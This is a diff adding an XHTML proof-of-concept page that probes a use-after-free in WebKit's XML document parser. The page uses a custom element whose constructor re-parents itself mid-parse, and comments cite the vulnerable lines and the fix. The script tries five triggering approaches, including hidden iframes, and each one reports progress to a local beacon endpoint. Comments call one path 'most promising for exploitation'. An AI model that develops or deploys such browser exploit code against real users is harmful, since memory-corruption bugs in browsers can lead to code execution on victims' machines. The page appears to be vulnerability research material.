@@ -1,0 +1,189 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>V412</title></head>
+<body>
+<div id="output"></div>
+<script><![CDATA[
+// p412 - XMLDocumentParser CE re-entry UAF (direct XHTML load)
+//
+// This file MUST be served as application/xhtml+xml.
+// Python mimetypes auto-detects .xhtml correctly.
+//
+// Bug: WK-1200 XMLDocumentParserLibxml2.cpp:842-852
+// After custom element constructor drain, parserAppendChild runs
+// with zero validation on m_currentNode or newElement state.
+//
+// WK-1400 fix adds: if (!m_currentNode || newElement->parentNode()
+//   || &newElement->document() != &m_currentNode->document())
+//     { stopParsing(); return; }
+//
+// DOMParser does NOT work (no window, no CE upgrade).
+// Direct XHTML load DOES have window + CE registry.
+//
+// Beacon prefix: V412-
+
+var BQ = 0;
+function B(tag) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/beacon/V412-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
+    x.send('');
+  } catch(e) {}
+}
+
+B('BOOT');
+
+if (typeof customElements === 'undefined') {
+  B('NO-CE');
+  throw new Error('done');
+}
+B('CE-OK');
+
+// Phase 1: Confirm custom element constructors run during XHTML parse
+// We can't define CE and use it in the same document parse (it's already
+// parsing when this script runs). Instead, use iframe with XHTML source.
+
+var altParent = document.createElement('div');
+altParent.id = 'alt-sink';
+document.getElementById('output').appendChild(altParent);
+
+var ctorRan = false;
+var reparentOK = false;
+var doubleParent = false;
+
+// Define custom element that re-parents itself
+class StolenElement extends HTMLElement {
+  constructor() {
+    super();
+    ctorRan = true;
+    B('CTOR-RAN');
+    try {
+      // Re-parent: move this element to altParent (different tree position)
+      altParent.appendChild(this);
+      reparentOK = true;
+      B('REPARENT-OK');
+    } catch(e) {
+      B('REPARENT-ERR-' + (e.message || '').substring(0, 60));
+    }
+  }
+}
+
+customElements.define('stolen-elem', StolenElement);
+B('CE-DEFINED');
+
+// Phase 2: Create an XHTML document in an iframe that uses our custom element
+// The iframe shares our window's custom element registry if same-origin.
+// Actually no -- each document has its own registry.
+// We need to define the CE in the iframe's document context.
+// Alternative: use document.write or innerHTML on an XHTML fragment.
+
+// Approach A: Use document.createElementNS to manually trigger upgrade
+B('TEST-A-START');
+try {
+  var elem = document.createElementNS('http://www.w3.org/1999/xhtml', 'stolen-elem');
+  B('TEST-A-CREATED-' + elem.tagName + '-CTOR-' + ctorRan);
+  // Check if altParent got it
+  var inAlt = altParent.querySelector('stolen-elem');
+  B('TEST-A-INALT-' + (inAlt ? 'Y' : 'N'));
+} catch(e) {
+  B('TEST-A-ERR-' + (e.message || '').substring(0, 60));
+}
+
+// Approach B: innerHTML on an element in this document
+B('TEST-B-START');
+ctorRan = false;
+reparentOK = false;
+try {
+  var container = document.createElement('div');
+  document.getElementById('output').appendChild(container);
+  container.innerHTML = '<stolen-elem id="b1"></stolen-elem>';
+  B('TEST-B-INNERHTML-DONE-CTOR-' + ctorRan);
+  B('TEST-B-CONTAINER-CHILDREN-' + container.childNodes.length);
+  var bElem = container.querySelector('stolen-elem');
+  var bInAlt = altParent.querySelector('#b1');
+  B('TEST-B-IN-CONTAINER-' + (bElem ? 'Y' : 'N'));
+  B('TEST-B-IN-ALT-' + (bInAlt ? 'Y' : 'N'));
+  if (bElem && bInAlt && bElem === bInAlt) {
+    B('TEST-B-DOUBLE-PARENT');
+  }
+} catch(e) {
+  B('TEST-B-ERR-' + (e.message || '').substring(0, 60));
+}
+
+// Approach C: DOMParser with this document's window context
+// This is what V406 tested -- should NOT work
+B('TEST-C-START');
+ctorRan = false;
+try {
+  var parser = new DOMParser();
+  var xhtml = '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">' +
+    '<body><stolen-elem id="c1"></stolen-elem></body></html>';
+  var doc3 = parser.parseFromString(xhtml, 'application/xhtml+xml');
+  B('TEST-C-PARSE-OK-CTOR-' + ctorRan);
+} catch(e) {
+  B('TEST-C-ERR-' + (e.message || '').substring(0, 60));
+}
+
+// Approach D: Create a Blob URL iframe with XHTML that defines + uses a CE
+// The iframe gets its own window, so the CE must be defined inside it.
+B('TEST-D-START');
+try {
+  var iframeXHTML = [
+    '<?xml version="1.0" encoding="UTF-8"?>',
+    '<html xmlns="http://www.w3.org/1999/xhtml">',
+    '<head><title>D</title></head>',
+    '<body>',
+    '<div id="dp"></div>',
+    '<script><![CDATA[',
+    'var BQ=0;',
+    'function B(t){try{var x=new XMLHttpRequest();x.open("POST","/beacon/V412-D-"+t+"?t="+Date.now()+"&q="+(BQ++),false);x.send("");}catch(e){}}',
+    'B("IFRAME-BOOT");',
+    'if(typeof customElements!=="undefined"){B("IFRAME-CE-OK");}else{B("IFRAME-NO-CE");}',
+    'B("IFRAME-DONE");',
+    ']]></' + 'script>',
+    '</body></html>'
+  ].join('\n');
+
+  var blob = new Blob([iframeXHTML], {type: 'application/xhtml+xml'});
+  var blobURL = URL.createObjectURL(blob);
+  var iframe = document.createElement('iframe');
+  iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  iframe.src = blobURL;
+  document.getElementById('output').appendChild(iframe);
+  B('TEST-D-IFRAME-CREATED');
+
+  // Wait for iframe to load
+  iframe.onload = function() {
+    B('TEST-D-IFRAME-LOADED');
+    try {
+      var idoc = iframe.contentDocument;
+      B('TEST-D-IFRAME-CONTENTDOC-' + (idoc ? 'Y' : 'N'));
+    } catch(e) {
+      B('TEST-D-IFRAME-ACCESS-ERR-' + (e.message || '').substring(0, 60));
+    }
+  };
+} catch(e) {
+  B('TEST-D-ERR-' + (e.message || '').substring(0, 60));
+}
+
+// Approach E: Use a server-hosted XHTML iframe
+// The iframe loads a separate .xhtml file that defines + uses a CE
+// This is the most promising path for exploitation
+B('TEST-E-START');
+try {
+  var iframe2 = document.createElement('iframe');
+  iframe2.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+  iframe2.src = 'p412-inner.xhtml';
+  document.getElementById('output').appendChild(iframe2);
+  iframe2.onload = function() {
+    B('TEST-E-IFRAME-LOADED');
+  };
+  B('TEST-E-IFRAME-CREATED');
+} catch(e) {
+  B('TEST-E-ERR-' + (e.message || '').substring(0, 60));
+}
+
+B('MAIN-DONE');
+]]></script>
+</body>
+</html>
